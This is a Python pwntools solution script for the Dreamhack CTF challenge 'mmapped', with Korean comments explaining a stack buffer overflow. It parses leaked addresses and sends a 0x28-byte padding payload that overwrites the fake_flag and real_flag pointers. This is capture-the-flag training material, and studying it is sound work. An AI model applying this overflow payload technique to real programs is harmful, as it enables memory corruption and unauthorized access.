'''
[Dreamhack] mmapped
1. 취약점: read(1, buf, 60)으로 변수보다 많이 입력을 받음으로써 스택 버퍼 오버플로우(BOF) 발생
2. 시나리오: buf에서 real_flag 사이를 더미(Dummy)로 채우고, fake_flag와 real_flag의 값을 서로 바꾼다.
3. 페이로드 구조: [Dummy (buf2fake_flag)] + [fake_flag 주소] + [real_flag 주소]
'''

from pwn import *

p = process('./chall')
# p = remote('IP', PORT)

p.recvuntil(b'fake flag address: ')
fake_flag_addr = int(p.recvuntil(b'\n'), 16)
print(f"{hex(fake_flag_addr)=}")

p.recvuntil(b'buf address: ')
buf_addr = int(p.recvuntil(b'\n'), 16)
print(f"{hex(buf_addr)=}")

p.recvuntil(b'real flag address (mmapped address): ')
real_flag_addr = int(p.recvuntil(b'\n'), 16)
print(f"{hex(real_flag_addr)=}")

payload = b'A' * 0x28 + p64(fake_flag_addr) + p64(real_flag_addr)

p.sendlineafter(b'input: ', payload)

p.interactive()